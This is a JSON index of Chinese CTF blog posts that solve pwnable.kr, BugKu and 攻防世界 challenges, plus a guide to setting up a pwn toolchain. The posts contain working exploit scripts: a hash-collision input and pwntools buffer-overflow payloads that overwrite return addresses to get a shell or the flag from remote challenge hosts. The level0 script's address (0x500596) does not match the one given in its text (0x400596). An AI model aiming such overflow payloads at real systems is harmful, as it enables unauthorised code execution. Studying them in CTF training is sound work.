{"posts":[{"title":"[pwnable.kr]collision","content":"ssh连接后，可查看代码如下： #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } 分析代码得知传入的参数要经过check_password()的处理，且小于20个字节，且必须等于hashcode。 分析check_password()函数： unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } 这里是将char*p强制转换成int*p。int类型在32位机里占4字节，char类型占1个字节，所以是将20个字节的字符串转化成了5组，每组4个字节。 因此，最理想的情况下是将hashcode的值五等份。其值转为10进制为568134124，无法被五整除。 所以考虑(568134124+1)/5=113626825，这样113626825*4+113626824就等于568134124了。 因为C语言是小段存储，113626825转为十六进制为0x6c5cec9，要写成&quot;C9 CE C5 06&quot;这样的格式。即\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 由于ASCII码只包含128位，计算的字符都是不可显示字符，要利用python写入： ./col `python -c 'print &quot;\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06&quot;'` ","link":"https://shawr00t.github.io/pwnablekrcollision/"},{"title":"[pwnable.kr]fd","content":"ssh连进去，没有查看flag文件的权限。 fd.c代码如下： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } 很直接的可以看到得到flag的条件是让buf等于&quot;LETMEWIN\\n&quot;。 因为read函数的第一个参数为0时是写入，所以让fd为零即可。顺便马一下，atoi()是转数字的函数，和python中的int(str)差不多。0x1234转为十进制为4660，执行时第一个参数为4660，然后输入LETMEWIN，敲回车得到flag。 ","link":"https://shawr00t.github.io/pwnablekrfd/"},{"title":"[BugKu]overflowPWN","content":"checksec看了下，四个保护都没有开。 main中代码如下： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-30h] memset(&amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;say something?&quot;); read(0, &amp;s, 0x100uLL); puts(&quot;oh,that's so boring!&quot;); return 0; } 还看到了直接获取flag的get_shell_函数，地址是0x400751： int get_shell_() { puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;); puts(&quot;this is your flag!&quot;); return system(&quot;cat flag&quot;); } 可以利用read函数溢出让返回地址为0x400751，exp如下： from pwn import * p = remote('114.67.246.176',16081) payload = 'a'*0x30+'a'*0x8+p64(0x400751) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/bugkuoverflowpwn/"},{"title":"[攻防世界]PWN-level0","content":"checksec查看一下信息，发现其开启了NX保护。 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 使用IDA打开，main中只有这几行代码： int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;Hello, World\\n&quot;, 0xDuLL); return vulnerable_function(1LL, &quot;Hello, World\\n&quot;); } 双击vulnerable_function()函数，看到如下代码： ssize_t vulnerable_function() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL); } 这里的rbp是栈基地址寄存器，保存的是当前的栈底地址为0x80，但是可输入的大小为0x200。 双击&amp;buf看到返回地址： 返回地址可以覆盖成callsystem()，地址为0x400596，可命令执行： int callsystem() { return system(&quot;/bin/sh&quot;); } 最终脚本如下： from pwn import * p = remote('111.200.241.244',63770) payload = 'a'*0x80+'a'*0x8+p64(0x500596) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/"},{"title":"[攻防世界]hello_pwn","content":"checksec检查程序保护机制： checksec可以检查程序保护机制，从而查看题目开启了哪些保护机制，有助于对题目的初步分析。 Arch：程序位数(查看是多少位的程序，比如32或64位)，也可以查看是哪个微处理器，比如i386为32位微处理器，amd64为64位微处理器(x86架构的延伸产品，称为x86-64，后改名为AMD64)； RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击。RELEO为&quot;Partial RELRO&quot;，说明我们对GOT表有写权限。 Stack：栈溢出监测，查看程序是否开启了Canary防护(一种对函数栈的监测保护：还没等到栈溢出，先返回canary word，从而监测栈溢出情况)。 NX ：No-eXecute(不可执行)，相等于windows的DEP(数据执行保护)，就是将攻击者构造的payload和shellcode(一般为系统远程执行命令)所在的内存页标识为不可执行，当攻击代码想要以数据代码伪装成可执行代码时，就会被检测到，从而使CPU抛出异常，从而不执行恶意指令。 PIE：内存地址空间分布随机化(ASLR:address space layout randomization) 根据图片结果可以得知，该题是一个64位的程序，没有开启RELRO，没有开启栈溢出检测，开启了NX，没有开启内存地址空间分布随机化。 把题目文件拖进IDA中查看伪代码： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { alarm(0x3Cu); setbuf(stdout, 0LL); puts(&quot;~~ welcome to ctf ~~ &quot;); puts(&quot;lets get helloworld for bof&quot;); read(0, &amp;unk_601068, 0x10uLL); if ( dword_60106C == 1853186401 ) sub_400686(); return 0LL; } alarm(0x3Cu);：alarm()中的参数0x3Cu是十六进制无符号数，即十进制对应60，所以该函数的作用是在程序运行60秒后，给进程发送SIGALRM信号，如果不另编写程序接受处理此信号，则默认结束此程序。 setbuf(stdout, 0LL);：是重置输出流，要么在网络传输中会传不出去。（本地加不加没区别 read(0, &amp;unk_601068, 0x10uLL);：read()可以读取数据，第一个参数为0，代表标准输入，第三个参数是输入的个数是0x10，即16个字节。就是从0x601068开始往后读取16个字节。 sub_400686()直接可以查看flag.txt文件： __int64 sub_400686() { system(&quot;cat flag.txt&quot;); return 0LL; } 所以要想拿到flag，必须要让dword_60106C == 1853186401。 因为能够利用unk_601068的读取数据，所以可以让数据溢出到dword_60106C，给dword_60106C赋值为0x6e756161，即可得到flag。 0x601068-0x60106c=0x4，看图也能看出来，缓冲区地址和目标地址之间的内存空间大小0x4。向其中填满脏数据即可。 from pwn import * p = remote('111.200.241.244', 64306) payload=0x4*'c'+p64(1853186401) #p64就是将一个数字转换为字符。 p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/"},{"title":"PWN环境搭建","content":"参考文档：https://github.com/leungbless/pwnVM-ovf 0x00 环境 操作系统：Ubuntu 16.04 0x01 更换源 cd ~ &amp;&amp; mkdir .pip cd ~/.pip &amp;&amp; touch pip.conf sudo gedit pip.conf 然后写入以下内容： [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=mirrors.aliyun.com sudo apt-get update sudo apt-get upgrade 0x02 安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型 sudo apt-get update sudo apt-get install git gdb gdb-multiarch sudo apt-get install &quot;binfmt*&quot; 0x03 安装gdb的插件pwndbg git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 0x04 安装PwnTools sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential pip install -U setuptools pip install --upgrade pip pip install --upgrade pwntools 这里如果出现报错，尝试： wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python get-pip.py pip install --upgrade pwntools 0X05 安装ssh sudo apt-get install ssh 0x06 安装ROPgadget工具 pip install ropgadget 0x07 安装qemu sudo apt-get install qemu-user 0x08 安装LibcSearcher(用处: 用来泄露libc库中函数的偏移的库) git clone https://github.com.cnpmjs.org/lieanu/LibcSearcher.git cd LibcSearcher sudo python setup.py develop 0x09 安装32位程序依赖的环境 sudo dpkg --add-architecture i386 sudo apt-get -y install lib32z1 lib32ncurses5 ","link":"https://shawr00t.github.io/pwn-huan-jing-da-jian/"}]}